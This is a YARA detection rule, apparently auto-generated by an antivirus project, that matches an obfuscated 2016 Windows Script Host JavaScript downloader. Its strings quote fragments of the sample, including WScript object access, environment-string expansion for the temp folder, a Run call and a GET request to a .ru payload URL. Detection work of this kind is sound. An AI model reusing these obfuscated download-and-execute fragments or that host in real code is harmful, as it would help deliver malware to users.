rule sig_20160428_3a0f2fa68a79db141542c991a0c819a6 {
  meta:
    description = "datamaliciousorder - file 20160428_3a0f2fa68a79db141542c991a0c819a6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a33f5a7bb7a2bada03b3153d3a789cd11cafabfb5d505e48311c210cd24e3e76"

  strings:
    $s1  = "function QoaLxhPjxUrjFtpJbgNet() {return UfjFcnPqpIojZufThmWdo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function QoaLxhPjxUrjFtpJbgNet() {return UfjFcnPqpIojZufThmWdo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function EzwKdvXaxWrcDitShnUcr(TiqRsoAncMwlUqxWvrZyb){UfjFcnPqpIojZufThmWdo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return UtjDtrPvzPsyBfbDuoHef - AkfUtvPgaAofAmxYpaYbt;};" fullword ascii
    $s5  = "var UfjFcnPqpIojZufThmWdo = function ZmcFrqWkwHlaMzeVouGuj() {return FuzHpbXryXhxShjInyNej[RabNoqSgzPvvGbmPvwLda](\"WScript\"+\"" ascii
    $s6  = "LtuAksUmkKfqMyqGzwLot[RtcBwbDyyZmxRgrMcsQmm](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s7  = "var UfjFcnPqpIojZufThmWdo = function ZmcFrqWkwHlaMzeVouGuj() {return FuzHpbXryXhxShjInyNej[RabNoqSgzPvvGbmPvwLda](\"WScript\"+\"" ascii
    $s8  = "var FuzHpbXryXhxShjInyNej = this[\"WScript\"];" fullword ascii
    $s9  = "function EzwKdvXaxWrcDitShnUcr(TiqRsoAncMwlUqxWvrZyb){UfjFcnPqpIojZufThmWdo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function PxbCvkHhzZecKmbYdbZrn(UtjDtrPvzPsyBfbDuoHef, AkfUtvPgaAofAmxYpaYbt){QivMyqKgdTnnTcaBynQdy = QivMyqKgdTnnTcaBynQdy * 1; " ascii
    $s11 = "if (LtuAksUmkKfqMyqGzwLot[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function ZazNozInlEcmAsmCbvTcc(){return HxmPlpBgpDrwLdiZbkSpw + \"\";};" fullword ascii
    $s13 = "function SnfYykVkcIneIwlAqfAvc() {return ((SisHszCxqLgoWlrIjrHzv == true) && (SisHszCxqLgoWlrIjrHzv == UkuJmzLgtMewNsoZcoStu)) ?" ascii
    $s14 = "return PxbCvkHhzZecKmbYdbZrn(1 == 1 ? KyaWwiPrrMnoIevFnzYdm : 0, 1 == 1 ? SroFfeErfBcmQohKmyDyi : 0);" fullword ascii
    $s15 = "}while (VhlNgsYqcPtsYpfDnoRej);" fullword ascii
    $s16 = "var UkuJmzLgtMewNsoZcoStu = false;" fullword ascii
    $s17 = "ZyxOnjEjvZdbMkrEbaDzs = true;" fullword ascii
    $s18 = "function CgzEqzXjcRswWisJoxZkq(JdyFjiCeuZyxNwnOqzBro) {var AtxZdkAwmHkbRqwZltGoi = (1, 2, 3, 4, 5, JdyFjiCeuZyxNwnOqzBro); retur" ascii
    $s19 = "function WqoAbkTgbEizToaAxvGxw()" fullword ascii
    $s20 = "var SisHszCxqLgoWlrIjrHzv = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}